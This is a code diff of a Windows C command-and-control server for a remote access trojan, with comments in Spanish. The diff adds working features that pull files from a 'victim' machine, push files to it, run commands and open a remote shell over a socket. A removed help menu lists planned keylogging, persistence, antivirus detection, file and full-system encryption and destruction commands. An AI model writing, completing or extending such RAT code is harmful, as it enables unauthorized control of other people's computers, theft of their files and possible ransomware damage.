@@ -7,6 +7,15 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h> 
+#include <sys/stat.h>
+#include <direct.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <shlwapi.h>
+#include <locale.h>
+#include "../src/base64.c"
+
+// Upload / Download Fully functional
 
 // Definiciones
 #define SOCKBUFFER 2048
@@ -21,14 +30,18 @@
 #define WHITE   FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE
 
 // Prototipo
-int startServer();
+int mainFunction(int targetConn, char *clientIP, unsigned short clientPort);
 int shell(SOCKET targetConn, char *clientIP, unsigned short clientPort);
+int ReadAndSendFile(SOCKET targetConn, char *file, char *instruct);
 int sndAndExecCmd(SOCKET targetConn, char *command, char *resp);
-int downloadFunc(char *command);
-void closeConection(SOCKET targetConn, char *command, size_t instructLen, char *clientIP, unsigned short clientPort);
-void printColor(char* text, int color);
-void ctrlCHandler(int sig);
+int downloadFunc(char *command, SOCKET targetConn, char *ip); 
+int startServer();
 void helpPannel();
+void ctrlCHandler(int sig);
+void checkStart(char *IPAddress);
+void printColor(char* text, int color);
+void StartSending(SOCKET targetConn, char *instruct);
+void closeConection(SOCKET targetConn, char *command, size_t instructLen, char *clientIP, unsigned short clientPort);
 
 void ctrlCHandler(int sig) {
     // Exit ctrl + c 
@@ -50,53 +63,28 @@ void closeConection(SOCKET targetConn, char *command, size_t instructLen, char *
     send(targetConn, command, instructLen, 0);
     closesocket(targetConn);
 }
+ 
+void checkStart(char *IPAddress){
+    char formed[SOCKBUFFER];
+    snprintf(formed, SOCKBUFFER, "./DATA/%s", IPAddress);
+    struct stat buffer;
+    if (stat("./DATA", &buffer) != 0) {
+        mkdir("./DATA"); 
+    }
+    if (stat(formed, &buffer) != 0){
+        mkdir(formed);   
+    }  
+}
 
 void helpPannel(){
     printf("\n\tAvailable Commands:\n\n");
-    printf("\t\t| [!>] search <extension> (N/A) -> Search for files with named extension\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] downloadDir <path> (N/A) -> Download A full dir\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] download <path> (N/A) -> Download A File From Target PC\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] startTask (N/A)       -> Monitoring & kill tasks managers\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] check (N/A)           -> Check For Administrator Privileges\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] sysinfo (N/A)         -> Get System Information\n");
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] shell                 -> Enter Shell Mode \n");
+    printf("\t\t---------------------------------------------------------\n");  
+    printf("\t\t| [!>] download <file>       -> Download from target \n");
     printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] av (N/A)              -> Try Detect Anti-Virus\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] upload <path> (N/A)   -> Upload local File To Target PC\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] get <url> (N/A)       -> Download A File To Target PC From Any Website\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] persistence (N/A)     -> Try to get persistence (needed root)\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] lowpersistence (N/A)  -> Try to get persistence (no root)\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] exec <command> (N/A)  -> Exec command in no shell mode\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] cryptDir <dir> (N/A)  -> Crypt a full folder in target\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] crypt <file> (N/A)    -> Crypt a file in target\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] keylog_dump (N/A)     -> Dump The Keystrokes From Keylogger\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] screenshot (N/A)      -> Take a screenshot\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] scannet (N/A)         -> Scan all active hosts on target\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] scanhost <host> (N/A) -> Scan ports on host\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] hosts (N/A)           -> See hosts scanned with scannet\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] cryptAll              -> (N/A) Close connex and crypt full system\n");
-    printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] destruction (N/A)     -> Eliminate ALL and close conex\n");
-    printf("\t\t---------------------------------------------------------\n");
+    printf("\t\t| [!>] upload <file>         -> Upload local file to target\n");
+    printf("\t\t---------------------------------------------------------\n");  
     printf("\t\t| [!>] q / exit              -> Exit the conection\n");
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] q -y / exit -y        -> Terminate the conection (close victim binary)\n");
@@ -104,7 +92,59 @@ void helpPannel(){
 
 }
 
-int sndAndExecCmd(SOCKET targetConn, char *command, char *resp){
+void StartSending(SOCKET targetConn, char *instruct){
+    char *file = malloc(strlen(instruct) + 1); // Asigna memoria a 'file'
+    char toReplace[] = "upload ";
+
+    char *substr = strstr(instruct, toReplace);
+    size_t remainingLength = strlen(substr + strlen(toReplace));
+    memmove(file, substr + strlen(toReplace), remainingLength + 1);
+    ReadAndSendFile(targetConn, file, instruct);
+
+}
+
+int ReadAndSendFile(SOCKET targetConn, char *file, char *instruct){
+    setlocale(LC_ALL, "en_US.UTF-8");
+
+    FILE *ptr;
+    // Abrimos el archivo en modo de lectura
+    ptr = fopen(file, "rb");
+
+    if (ptr == NULL) {
+        printColor("\n\t[!>] ", RED); printColor("No se puede abrir el archivo.\n\n", YELLOW);
+        //send(conn, "No se puede abrir el archivo.\n", strlen("No se puede abrir el archivo.\n"), 0);
+        send(targetConn, "end\0", strlen("end\0"), 0);
+        return 1;
+    } 
+    
+    send(targetConn, instruct, strlen(instruct), 0); 
+    char buffer[SOCKBUFFER];  // Búfer para leer desde el archivo
+
+    // Inicializamos los búferes con valores nulos 
+    memset(buffer, 0, sizeof(buffer));
+
+    // Lee el archivo en búferes y codifícalo en Base64 antes de enviarlo
+    size_t bytesRead;
+
+    while ((bytesRead = fread(buffer, 1, SOCKBUFFER, ptr)) > 0) { 
+        printf("%s\n", buffer);
+        char *base64Encoded = base64_encode(buffer, strlen(buffer));
+
+        send(targetConn, base64Encoded, strlen(base64Encoded), 0); 
+        free(base64Encoded);  // Liberar la memoria asignada por base64_encode
+    }
+
+    // Cierra el archivo
+    fclose(ptr); 
+    Sleep(300);
+    send(targetConn, "end\0", strlen("end\0"), 0); 
+    printColor("\n\t[*>] ", YELLOW); printColor("File Uploaded Successfully.\n\n", BLUE);
+    return 0;
+}
+
+int sndAndExecCmd(SOCKET targetConn, char *command, char *resp){ 
+    //Limpiar buffer
+    memset(resp, 0, sizeof(resp));
     // Enviar comando
     send(targetConn, command, strlen(command), 0);
     
@@ -128,7 +168,7 @@ int shell(SOCKET targetConn, char *clientIP, unsigned short clientPort){
     char resp[SOCKBUFFER];
     char formattedString[50] = "";
 
-    printf("\n\t[*>] ", YELLOW); printColor("Entering Shell Mode\n\n", BLUE);
+    printColor("\n\t[*>] ", YELLOW); printColor("Entering Shell Mode\n\n", BLUE);
     send(targetConn, "shell", strlen("shell"), 0);
 
     snprintf(formattedString, sizeof(formattedString), "* %s>: ", clientIP);
@@ -152,7 +192,7 @@ int shell(SOCKET targetConn, char *clientIP, unsigned short clientPort){
             send(targetConn, command, strlen(command), 0);
             break;
 
-        } else if (strcmp(command, "exit") == 0){ 
+        } else if (strstr(command, "exit") != NULL){ 
             printColor("\n\t[!>] ", RED); printColor("For exit shell mode type 'q'\n\n", YELLOW);
 
         } else if (strlen(command) == 0){
@@ -165,34 +205,78 @@ int shell(SOCKET targetConn, char *clientIP, unsigned short clientPort){
 
 }
 
-int downloadFunc(char *command){
-    //Variables necesarias
+int downloadFunc(char *command, SOCKET targetConn, char *ip) {
+    // Variables necesarias
+    char formed[100];
+    snprintf(formed, SOCKBUFFER, " check path -> ./DATA/%s", ip);
     char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
     char toReplace[] = "download ";
 
     char *substr = strstr(command, toReplace);
     size_t remainingLength = strlen(substr + strlen(toReplace));
     memmove(file, substr + strlen(toReplace), remainingLength + 1);
- 
-    printColor("\n\t[*>] ", YELLOW); printColor("Downloading file ", BLUE); printColor(file, YELLOW); printf("\n\n");
-    // lógica para descargar archivos
+    printColor("\n\t[*>] ", YELLOW); printColor("Downloading file ", BLUE); printColor(file, YELLOW); printColor(formed, BLUE); printf("\n");
+    send(targetConn, command, strlen(command), 0);
 
-    free(file); 
+    // Lógica para descargar archivos
+    char recvData[SOCKBUFFER];  // Utilizamos un búfer para recibir datos
+
+    // Inicializamos el búfer con valores nulos para evitar problemas con strcat
+    memset(recvData, 0, sizeof(recvData));
+
+    // Abre el archivo para escritura
+    char *base = PathFindFileName(file);
+    snprintf(formed, SOCKBUFFER, "./DATA/%s/%s", ip, base);
+    FILE *fp = fopen(formed, "w");
+
+    if (fp == NULL) {
+        // Manejo de error de apertura de archivo
+        free(file);
+        return 1;
+    }
+
+    while (true) {
+        int bytesRead = recv(targetConn, recvData, SOCKBUFFER, 0);
+
+        if (bytesRead <= 0) {
+            // Manejo de error de recepción
+            printf("Error en la recepción de datos.\n");
+            fclose(fp);
+            free(file);
+            return 1;
+        }
+
+        if (strstr(recvData, "end\0") != NULL) {
+            // Recibido el indicador de final "end\0"
+            break;
+        } else {
+            // Escribir los datos recibidos en el archivo
+            char *decodedData = base64_decode(recvData);
+            fwrite(decodedData, 1, strlen(decodedData), fp);
+            free(decodedData);
+        }
+    }
+
+    // Cierra el archivo
+    fclose(fp);
+    free(file);
     return 0;
-
-
 }
 
+
 int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
-    char command[255] = "";
+    char command[SOCKBUFFER] = "";
     char resp[SOCKBUFFER];
     char formattedString[50] = "";
+
+    //Estructura de carpetas:
+    checkStart(clientIP);
+
     snprintf(formattedString, sizeof(formattedString), "* %s>: ", clientIP);
     while (true){
-        
         printColor("\n<*", YELLOW); printColor(" C&C ", RED); printColor(formattedString, YELLOW); 
         fgets(command, sizeof(command), stdin); 
-
+        
         // Eliminamos "\n" del final
         size_t instructLen = strlen(command);
         if (instructLen > 0 && command[instructLen -1] == '\n'){
@@ -207,21 +291,30 @@ int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
             closeConection(targetConn, command, instructLen, clientIP, clientPort);
             break;
 
-        } else {
+        } else { 
             // Descargar Archivo
             if (strcmp(command, "help") == 0 || strcmp(command, "h") == 0){
                 helpPannel();              
 
             } else if (strstr(command, "download") != NULL){
-                downloadFunc(command);
-                continue;
+                downloadFunc(command, targetConn, clientIP); 
             
             } else if (strcmp(command, "shell") == 0){
                 shell(targetConn, clientIP, clientPort);
             
+            } else if (strstr(command, "exec") != NULL){
+                char resp[SOCKBUFFER];
+                sndAndExecCmd(targetConn, command, resp); 
+            
+            } else if(strstr(command, "upload") != NULL){
+                StartSending(targetConn, command);
+                
+            } else {
+                printColor("\n\t[!>] ", RED); printColor("Instruct Not Known...\n", YELLOW);
             }
         }
     }
+    return 0;
 }
 
 int startServer(){
@@ -263,12 +356,14 @@ int startServer(){
     unsigned short clientPort = ntohs(clientAddr.sin_port);
 
     //printf("\t%s[>]%s New Connection From: %s %s-%u\n\n", YELLOW, RED, end, clientIP, clientPort);
-    printColor("\t[>] ", YELLOW); printColor("New Connection From: ", RED); printf("%s-%u\n\n", clientIP, clientPort);
-
+    printColor("\t[>] ", YELLOW); printColor("New Connection From: ", RED); printf("%s-%u\n", clientIP, clientPort);
+ 
     mainFunction(targetConn, clientIP, clientPort);
     
 
 }
+
+
 
 int main(int argc, char const* argv[]){
     // Atrapamos ctrl + c 
